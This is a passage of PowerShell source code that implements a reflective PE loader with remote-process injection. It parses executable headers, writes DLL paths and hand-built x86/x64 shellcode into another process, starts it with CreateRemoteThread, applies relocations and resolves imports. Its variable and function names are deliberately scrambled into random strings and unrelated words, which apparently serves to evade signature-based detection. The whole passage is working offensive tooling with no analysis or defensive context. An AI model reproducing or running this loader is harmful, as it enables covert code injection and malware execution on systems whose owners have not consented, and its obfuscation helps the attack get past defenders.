		$aHjsvoBp99 = weakened -PEHandle $EbqIceBD99 -Win32Types $zAfvSIaE99
		
		$PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $EbqIceBD99
		$PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($aHjsvoBp99.IMAGE_NT_HEADERS)
		$PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($aHjsvoBp99.NtHeadersPtr)
		$PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($aHjsvoBp99.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($aHjsvoBp99.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		
		if ($PEInfo.PE64Bit -eq $true)
		{
			[IntPtr]$NTHVDavr99 = [IntPtr](palmettoes ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$zAfvSIaE99.IMAGE_NT_HEADERS64)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $NTHVDavr99
		}
		else
		{
			[IntPtr]$NTHVDavr99 = [IntPtr](palmettoes ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$zAfvSIaE99.IMAGE_NT_HEADERS32)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $NTHVDavr99
		}
		
		if (($aHjsvoBp99.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
		}
		elseif (($aHjsvoBp99.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
		}
		else
		{
			Throw "PE file is not an EXE or DLL"
		}
		
		return $PEInfo
	}
	
	
	Function repairs
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$ILaWeMxR99,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$oCzajhJX99
		)
		
		$ZtgTmrIJ99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		$httfOBUT99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($oCzajhJX99)
		$xARXhcSi99 = [UIntPtr][UInt64]([UInt64]$httfOBUT99.Length + 1)
		$VAjYoOoB99 = $EuQVwKhg99.VirtualAllocEx.Invoke($ILaWeMxR99, [IntPtr]::Zero, $xARXhcSi99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($VAjYoOoB99 -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}
		[UIntPtr]$gIylziGQ99 = [UIntPtr]::Zero
		$HXKXgwOZ99 = $EuQVwKhg99.WriteProcessMemory.Invoke($ILaWeMxR99, $VAjYoOoB99, $oCzajhJX99, $xARXhcSi99, [Ref]$gIylziGQ99)
		
		if ($HXKXgwOZ99 -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if ($xARXhcSi99 -ne $gIylziGQ99)
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}
		
		$XMdOXMeB99 = $EuQVwKhg99.GetModuleHandle.Invoke("kernel32.dll")
		$RPgIivVZ99 = $EuQVwKhg99.GetProcAddress.Invoke($XMdOXMeB99, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
		
		[IntPtr]$tudHHCEv99 = [IntPtr]::Zero
		if ($PEInfo.PE64Bit -eq $true)
		{
			$akxiqVHY99 = $EuQVwKhg99.VirtualAllocEx.Invoke($ILaWeMxR99, [IntPtr]::Zero, $xARXhcSi99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			if ($akxiqVHY99 -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
			}
			
			
			$SfpzztIS99 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$lvpSEcaO99 = @(0x48, 0xba)
			$jTaNDtpt99 = @(0xff, 0xd2, 0x48, 0xba)
			$zEFVvAWK99 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			
			$eUzjXOor99 = $SfpzztIS99.Length + $lvpSEcaO99.Length + $jTaNDtpt99.Length + $zEFVvAWK99.Length + ($ZtgTmrIJ99 * 3)
			$NQwabgkC99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($eUzjXOor99)
			$fQELDiOg99 = $NQwabgkC99
			
			faculty -Bytes $SfpzztIS99 -MemoryAddress $NQwabgkC99
			$NQwabgkC99 = palmettoes $NQwabgkC99 ($SfpzztIS99.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($VAjYoOoB99, $NQwabgkC99, $false)
			$NQwabgkC99 = palmettoes $NQwabgkC99 ($ZtgTmrIJ99)
			faculty -Bytes $lvpSEcaO99 -MemoryAddress $NQwabgkC99
			$NQwabgkC99 = palmettoes $NQwabgkC99 ($lvpSEcaO99.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($RPgIivVZ99, $NQwabgkC99, $false)
			$NQwabgkC99 = palmettoes $NQwabgkC99 ($ZtgTmrIJ99)
			faculty -Bytes $jTaNDtpt99 -MemoryAddress $NQwabgkC99
			$NQwabgkC99 = palmettoes $NQwabgkC99 ($jTaNDtpt99.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($akxiqVHY99, $NQwabgkC99, $false)
			$NQwabgkC99 = palmettoes $NQwabgkC99 ($ZtgTmrIJ99)
			faculty -Bytes $zEFVvAWK99 -MemoryAddress $NQwabgkC99
			$NQwabgkC99 = palmettoes $NQwabgkC99 ($zEFVvAWK99.Length)
			
			$LpjVBbOG99 = $EuQVwKhg99.VirtualAllocEx.Invoke($ILaWeMxR99, [IntPtr]::Zero, [UIntPtr][UInt64]$eUzjXOor99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($LpjVBbOG99 -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for shellcode"
			}
			
			$HXKXgwOZ99 = $EuQVwKhg99.WriteProcessMemory.Invoke($ILaWeMxR99, $LpjVBbOG99, $fQELDiOg99, [UIntPtr][UInt64]$eUzjXOor99, [Ref]$gIylziGQ99)
			if (($HXKXgwOZ99 -eq $false) -or ([UInt64]$gIylziGQ99 -ne [UInt64]$eUzjXOor99))
			{
				Throw "Unable to write shellcode to remote process memory."
			}
			
			$oxKACvse99 = splodge -ProcessHandle $ILaWeMxR99 -StartAddress $LpjVBbOG99 -Win32Functions $EuQVwKhg99
			$BKfwcaqY99 = $EuQVwKhg99.WaitForSingleObject.Invoke($oxKACvse99, 20000)
			if ($BKfwcaqY99 -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			[IntPtr]$vRZDoedR99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ZtgTmrIJ99)
			$BKfwcaqY99 = $EuQVwKhg99.ReadProcessMemory.Invoke($ILaWeMxR99, $akxiqVHY99, $vRZDoedR99, [UIntPtr][UInt64]$ZtgTmrIJ99, [Ref]$gIylziGQ99)
			if ($BKfwcaqY99 -eq $false)
			{
				Throw "Call to ReadProcessMemory failed"
			}
			[IntPtr]$tudHHCEv99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($vRZDoedR99, [Type][IntPtr])
			$EuQVwKhg99.VirtualFreeEx.Invoke($ILaWeMxR99, $akxiqVHY99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			$EuQVwKhg99.VirtualFreeEx.Invoke($ILaWeMxR99, $LpjVBbOG99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		}
		else
		{
			[IntPtr]$oxKACvse99 = splodge -ProcessHandle $ILaWeMxR99 -StartAddress $RPgIivVZ99 -ArgumentPtr $VAjYoOoB99 -Win32Functions $EuQVwKhg99
			$BKfwcaqY99 = $EuQVwKhg99.WaitForSingleObject.Invoke($oxKACvse99, 20000)
			if ($BKfwcaqY99 -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			[Int32]$OkoqlInR99 = 0
			$BKfwcaqY99 = $EuQVwKhg99.GetExitCodeThread.Invoke($oxKACvse99, [Ref]$OkoqlInR99)
			if (($BKfwcaqY99 -eq 0) -or ($OkoqlInR99 -eq 0))
			{
				Throw "Call to GetExitCodeThread failed"
			}
			
			[IntPtr]$tudHHCEv99 = [IntPtr]$OkoqlInR99
		}
		
		$EuQVwKhg99.VirtualFreeEx.Invoke($ILaWeMxR99, $VAjYoOoB99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		return $tudHHCEv99
	}
	
	
	Function undercharge
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$ILaWeMxR99,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$xUCYxAzI99,
		
		[Parameter(Position=2, Mandatory=$true)]
		[String]
		$FunctionName
		)
		$ZtgTmrIJ99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		$YjXsItbs99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($FunctionName)
		
		$DOUBCtjQ99 = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
		$xmPvGxrf99 = $EuQVwKhg99.VirtualAllocEx.Invoke($ILaWeMxR99, [IntPtr]::Zero, $DOUBCtjQ99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($xmPvGxrf99 -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}
		[UIntPtr]$gIylziGQ99 = [UIntPtr]::Zero
		$HXKXgwOZ99 = $EuQVwKhg99.WriteProcessMemory.Invoke($ILaWeMxR99, $xmPvGxrf99, $YjXsItbs99, $DOUBCtjQ99, [Ref]$gIylziGQ99)
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($YjXsItbs99)
		if ($HXKXgwOZ99 -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if ($DOUBCtjQ99 -ne $gIylziGQ99)
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}
		
		$XMdOXMeB99 = $EuQVwKhg99.GetModuleHandle.Invoke("kernel32.dll")
		$UHLjegRu99 = $EuQVwKhg99.GetProcAddress.Invoke($XMdOXMeB99, "GetProcAddress") #Kernel32 loaded to the same address for all processes
		
		$ljRXRkOj99 = $EuQVwKhg99.VirtualAllocEx.Invoke($ILaWeMxR99, [IntPtr]::Zero, [UInt64][UInt64]$ZtgTmrIJ99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($ljRXRkOj99 -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
		}
		
		
		[Byte[]]$xovuZZpK99 = @()
		if ($PEInfo.PE64Bit -eq $true)
		{
			$vrnWplwP99 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$BEWpMQKB99 = @(0x48, 0xba)
			$scQxSZSR99 = @(0x48, 0xb8)
			$lQdbnZXg99 = @(0xff, 0xd0, 0x48, 0xb9)
			$aYptvsUD99 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			$vrnWplwP99 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			$BEWpMQKB99 = @(0xb9)
			$scQxSZSR99 = @(0x51, 0x50, 0xb8)
			$lQdbnZXg99 = @(0xff, 0xd0, 0xb9)
			$aYptvsUD99 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		$eUzjXOor99 = $vrnWplwP99.Length + $BEWpMQKB99.Length + $scQxSZSR99.Length + $lQdbnZXg99.Length + $aYptvsUD99.Length + ($ZtgTmrIJ99 * 4)
		$NQwabgkC99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($eUzjXOor99)
		$fQELDiOg99 = $NQwabgkC99
		
		faculty -Bytes $vrnWplwP99 -MemoryAddress $NQwabgkC99
		$NQwabgkC99 = palmettoes $NQwabgkC99 ($vrnWplwP99.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($xUCYxAzI99, $NQwabgkC99, $false)
		$NQwabgkC99 = palmettoes $NQwabgkC99 ($ZtgTmrIJ99)
		faculty -Bytes $BEWpMQKB99 -MemoryAddress $NQwabgkC99
		$NQwabgkC99 = palmettoes $NQwabgkC99 ($BEWpMQKB99.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($xmPvGxrf99, $NQwabgkC99, $false)
		$NQwabgkC99 = palmettoes $NQwabgkC99 ($ZtgTmrIJ99)
		faculty -Bytes $scQxSZSR99 -MemoryAddress $NQwabgkC99
		$NQwabgkC99 = palmettoes $NQwabgkC99 ($scQxSZSR99.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($UHLjegRu99, $NQwabgkC99, $false)
		$NQwabgkC99 = palmettoes $NQwabgkC99 ($ZtgTmrIJ99)
		faculty -Bytes $lQdbnZXg99 -MemoryAddress $NQwabgkC99
		$NQwabgkC99 = palmettoes $NQwabgkC99 ($lQdbnZXg99.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($ljRXRkOj99, $NQwabgkC99, $false)
		$NQwabgkC99 = palmettoes $NQwabgkC99 ($ZtgTmrIJ99)
		faculty -Bytes $aYptvsUD99 -MemoryAddress $NQwabgkC99
		$NQwabgkC99 = palmettoes $NQwabgkC99 ($aYptvsUD99.Length)
		
		$LpjVBbOG99 = $EuQVwKhg99.VirtualAllocEx.Invoke($ILaWeMxR99, [IntPtr]::Zero, [UIntPtr][UInt64]$eUzjXOor99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
		if ($LpjVBbOG99 -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for shellcode"
		}
		
		$HXKXgwOZ99 = $EuQVwKhg99.WriteProcessMemory.Invoke($ILaWeMxR99, $LpjVBbOG99, $fQELDiOg99, [UIntPtr][UInt64]$eUzjXOor99, [Ref]$gIylziGQ99)
		if (($HXKXgwOZ99 -eq $false) -or ([UInt64]$gIylziGQ99 -ne [UInt64]$eUzjXOor99))
		{
			Throw "Unable to write shellcode to remote process memory."
		}
		
		$oxKACvse99 = splodge -ProcessHandle $ILaWeMxR99 -StartAddress $LpjVBbOG99 -Win32Functions $EuQVwKhg99
		$BKfwcaqY99 = $EuQVwKhg99.WaitForSingleObject.Invoke($oxKACvse99, 20000)
		if ($BKfwcaqY99 -ne 0)
		{
			Throw "Call to CreateRemoteThread to call GetProcAddress failed."
		}
		
		[IntPtr]$vRZDoedR99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ZtgTmrIJ99)
		$BKfwcaqY99 = $EuQVwKhg99.ReadProcessMemory.Invoke($ILaWeMxR99, $ljRXRkOj99, $vRZDoedR99, [UIntPtr][UInt64]$ZtgTmrIJ99, [Ref]$gIylziGQ99)
		if (($BKfwcaqY99 -eq $false) -or ($gIylziGQ99 -eq 0))
		{
			Throw "Call to ReadProcessMemory failed"
		}
		[IntPtr]$vatteDMm99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($vRZDoedR99, [Type][IntPtr])
		$EuQVwKhg99.VirtualFreeEx.Invoke($ILaWeMxR99, $LpjVBbOG99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$EuQVwKhg99.VirtualFreeEx.Invoke($ILaWeMxR99, $xmPvGxrf99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$EuQVwKhg99.VirtualFreeEx.Invoke($ILaWeMxR99, $ljRXRkOj99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		return $vatteDMm99
	}
	Function disfranchise
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$xcecESTK99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$EuQVwKhg99,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$zAfvSIaE99
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$NTHVDavr99 = [IntPtr](palmettoes ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$zAfvSIaE99.IMAGE_SECTION_HEADER)))
			$NbRCvNCn99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NTHVDavr99, [Type]$zAfvSIaE99.IMAGE_SECTION_HEADER)
		
			[IntPtr]$kkDXFMBm99 = [IntPtr](palmettoes ([Int64]$PEInfo.PEHandle) ([Int64]$NbRCvNCn99.VirtualAddress))
			
			$VdeLNsFe99 = $NbRCvNCn99.SizeOfRawData
			if ($NbRCvNCn99.PointerToRawData -eq 0)
			{
				$VdeLNsFe99 = 0
			}
			
			if ($VdeLNsFe99 -gt $NbRCvNCn99.VirtualSize)
			{
				$VdeLNsFe99 = $NbRCvNCn99.VirtualSize
			}
			
			if ($VdeLNsFe99 -gt 0)
			{
				irks -DebugString "disfranchise::MarshalCopy" -PEInfo $PEInfo -StartAddress $kkDXFMBm99 -Size $VdeLNsFe99 | Out-Null
				[System.Runtime.InteropServices.Marshal]::Copy($xcecESTK99, [Int32]$NbRCvNCn99.PointerToRawData, $kkDXFMBm99, $VdeLNsFe99)
			}
		
			if ($NbRCvNCn99.SizeOfRawData -lt $NbRCvNCn99.VirtualSize)
			{
				$mldIbjYm99 = $NbRCvNCn99.VirtualSize - $VdeLNsFe99
				[IntPtr]$StartAddress = [IntPtr](palmettoes ([Int64]$kkDXFMBm99) ([Int64]$VdeLNsFe99))
				irks -DebugString "disfranchise::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $mldIbjYm99 | Out-Null
				$EuQVwKhg99.memset.Invoke($StartAddress, 0, [IntPtr]$mldIbjYm99) | Out-Null
			}
		}
	}
	Function groomed
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$AHMZvGpX99,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$zAfvSIaE99
		)
		
		[Int64]$DGfvEMYF99 = 0
		$AWfQHJoN99 = $true #Track if the difference variable should be added or subtracted from variables
		[UInt32]$TUyqVBUf99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$zAfvSIaE99.IMAGE_BASE_RELOCATION)
		
		if (($AHMZvGpX99 -eq [Int64]$PEInfo.EffectivePEHandle) `
				-or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		{
			return
		}
		elseif ((threshed ($AHMZvGpX99) ($PEInfo.EffectivePEHandle)) -eq $true)
		{
			$DGfvEMYF99 = roads ($AHMZvGpX99) ($PEInfo.EffectivePEHandle)
			$AWfQHJoN99 = $false
		}
		elseif ((threshed ($PEInfo.EffectivePEHandle) ($AHMZvGpX99)) -eq $true)
		{
			$DGfvEMYF99 = roads ($PEInfo.EffectivePEHandle) ($AHMZvGpX99)
		}
		
		[IntPtr]$LIYvrVNZ99 = [IntPtr](palmettoes ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		while($true)
		{
			$tbOhoDMD99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LIYvrVNZ99, [Type]$zAfvSIaE99.IMAGE_BASE_RELOCATION)
			if ($tbOhoDMD99.SizeOfBlock -eq 0)
			{
				break
			}
			[IntPtr]$VuHHwFsW99 = [IntPtr](palmettoes ([Int64]$PEInfo.PEHandle) ([Int64]$tbOhoDMD99.VirtualAddress))
			$ZYvFpXFc99 = ($tbOhoDMD99.SizeOfBlock - $TUyqVBUf99) / 2
			for($i = 0; $i -lt $ZYvFpXFc99; $i++)
			{
				$xVDoWsNN99 = [IntPtr](palmettoes ([IntPtr]$LIYvrVNZ99) ([Int64]$TUyqVBUf99 + (2 * $i)))
				[UInt16]$SFlXwnpe99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($xVDoWsNN99, [Type][UInt16])
				[UInt16]$CMCCZexJ99 = $SFlXwnpe99 -band 0x0FFF
				[UInt16]$MGqmzeWC99 = $SFlXwnpe99 -band 0xF000
				for ($j = 0; $j -lt 12; $j++)
				{
					$MGqmzeWC99 = [Math]::Floor($MGqmzeWC99 / 2)
				}
				if (($MGqmzeWC99 -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
						-or ($MGqmzeWC99 -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
				{			
					[IntPtr]$XdeFTjbQ99 = [IntPtr](palmettoes ([Int64]$VuHHwFsW99) ([Int64]$CMCCZexJ99))
					[IntPtr]$wEjMXdlX99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($XdeFTjbQ99, [Type][IntPtr])
		
					if ($AWfQHJoN99 -eq $true)
					{
						[IntPtr]$wEjMXdlX99 = [IntPtr](palmettoes ([Int64]$wEjMXdlX99) ($DGfvEMYF99))
					}
					else
					{
						[IntPtr]$wEjMXdlX99 = [IntPtr](roads ([Int64]$wEjMXdlX99) ($DGfvEMYF99))
					}				
					[System.Runtime.InteropServices.Marshal]::StructureToPtr($wEjMXdlX99, $XdeFTjbQ99, $false) | Out-Null
				}
				elseif ($MGqmzeWC99 -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
				{
					Throw "Unknown relocation found, relocation value: $MGqmzeWC99, relocationinfo: $SFlXwnpe99"
				}
			}
			
			$LIYvrVNZ99 = [IntPtr](palmettoes ([Int64]$LIYvrVNZ99) ([Int64]$tbOhoDMD99.SizeOfBlock))
		}
	}
	Function hierarchy
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$EuQVwKhg99,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$zAfvSIaE99,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 4, Mandatory = $false)]
		[IntPtr]
		$ILaWeMxR99
		)
		
		$SnHSMpod99 = $false
		if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
		{
			$SnHSMpod99 = $true
		}
		
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$HiEQpzoi99 = palmettoes ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$aLtJgJZN99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($HiEQpzoi99, [Type]$zAfvSIaE99.IMAGE_IMPORT_DESCRIPTOR)
				
				if ($aLtJgJZN99.Characteristics -eq 0 `
						-and $aLtJgJZN99.FirstThunk -eq 0 `
						-and $aLtJgJZN99.ForwarderChain -eq 0 `
						-and $aLtJgJZN99.Name -eq 0 `
						-and $aLtJgJZN99.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done importing DLL imports"
					break
				}
				$yfUCyaSd99 = [IntPtr]::Zero
				$oCzajhJX99 = (palmettoes ([Int64]$PEInfo.PEHandle) ([Int64]$aLtJgJZN99.Name))
				$httfOBUT99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($oCzajhJX99)
				
				if ($SnHSMpod99 -eq $true)
				{
					$yfUCyaSd99 = repairs -RemoteProcHandle $ILaWeMxR99 -ImportDllPathPtr $oCzajhJX99
				}
				else
				{
					$yfUCyaSd99 = $EuQVwKhg99.LoadLibrary.Invoke($httfOBUT99)
				}
				if (($yfUCyaSd99 -eq $null) -or ($yfUCyaSd99 -eq [IntPtr]::Zero))
				{
					throw "Error importing DLL, DLLName: $httfOBUT99"
				}
				
				[IntPtr]$IIRZAGWi99 = palmettoes ($PEInfo.PEHandle) ($aLtJgJZN99.FirstThunk)
				[IntPtr]$nVtlskDd99 = palmettoes ($PEInfo.PEHandle) ($aLtJgJZN99.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
				[IntPtr]$NjARgKkU99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($nVtlskDd99, [Type][IntPtr])
				
				while ($NjARgKkU99 -ne [IntPtr]::Zero)
				{
					$xeWpKZdV99 = ''
					[IntPtr]$skTruYpT99 = [IntPtr]::Zero
					if([Int64]$NjARgKkU99 -lt 0)
					{
						$xeWpKZdV99 = [Int64]$NjARgKkU99 -band 0xffff #This is actually a lookup by ordinal
					}
					else
					{
						[IntPtr]$UqgHdqkb99 = palmettoes ($PEInfo.PEHandle) ($NjARgKkU99)
						$UqgHdqkb99 = palmettoes $UqgHdqkb99 ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						$xeWpKZdV99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($UqgHdqkb99)
					}
					
					if ($SnHSMpod99 -eq $true)
					{
						[IntPtr]$skTruYpT99 = undercharge -RemoteProcHandle $ILaWeMxR99 -RemoteDllHandle $yfUCyaSd99 -FunctionName $xeWpKZdV99
					}
					else
					{
						if($xeWpKZdV99 -is [string])
						{
						    [IntPtr]$skTruYpT99 = $EuQVwKhg99.GetProcAddress.Invoke($yfUCyaSd99, $xeWpKZdV99)
						}
						else
						{
						    [IntPtr]$skTruYpT99 = $EuQVwKhg99.GetProcAddressOrdinal.Invoke($yfUCyaSd99, $xeWpKZdV99)
						}
					}
					
					if ($skTruYpT99 -eq $null -or $skTruYpT99 -eq [IntPtr]::Zero)
					{
						Throw "New function reference is null, this is almost certainly a bug in this script. Function: $xeWpKZdV99. Dll: $httfOBUT99"
					}
					[System.Runtime.InteropServices.Marshal]::StructureToPtr($skTruYpT99, $IIRZAGWi99, $false)
					
					$IIRZAGWi99 = palmettoes ([Int64]$IIRZAGWi99) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$nVtlskDd99 = palmettoes ([Int64]$nVtlskDd99) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$NjARgKkU99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($nVtlskDd99, [Type][IntPtr])
				}
				
				$HiEQpzoi99 = palmettoes ($HiEQpzoi99) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$zAfvSIaE99.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
	}
	Function charity
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt32]
		$nXsmvjcA99
		)
		
		$VUQzbgwt99 = 0x0
		if (($nXsmvjcA99 -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		{
			if (($nXsmvjcA99 -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($nXsmvjcA99 -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$VUQzbgwt99 = $Win32Constants.PAGE_EXECUTE_READWRITE
				}
				else
				{
					$VUQzbgwt99 = $Win32Constants.PAGE_EXECUTE_READ
				}
			}
			else
			{
				if (($nXsmvjcA99 -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$VUQzbgwt99 = $Win32Constants.PAGE_EXECUTE_WRITECOPY
				}
				else
				{
					$VUQzbgwt99 = $Win32Constants.PAGE_EXECUTE
				}
			}
		}
		else
		{
			if (($nXsmvjcA99 -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($nXsmvjcA99 -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$VUQzbgwt99 = $Win32Constants.PAGE_READWRITE
				}
				else
				{
					$VUQzbgwt99 = $Win32Constants.PAGE_READONLY
				}
			}
			else
			{
				if (($nXsmvjcA99 -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$VUQzbgwt99 = $Win32Constants.PAGE_WRITECOPY
				}
				else
				{
					$VUQzbgwt99 = $Win32Constants.PAGE_NOACCESS
				}
			}
		}
		
		if (($nXsmvjcA99 -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		{
			$VUQzbgwt99 = $VUQzbgwt99 -bor $Win32Constants.PAGE_NOCACHE
		}
		
		return $VUQzbgwt99
	}
	Function sunspots
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
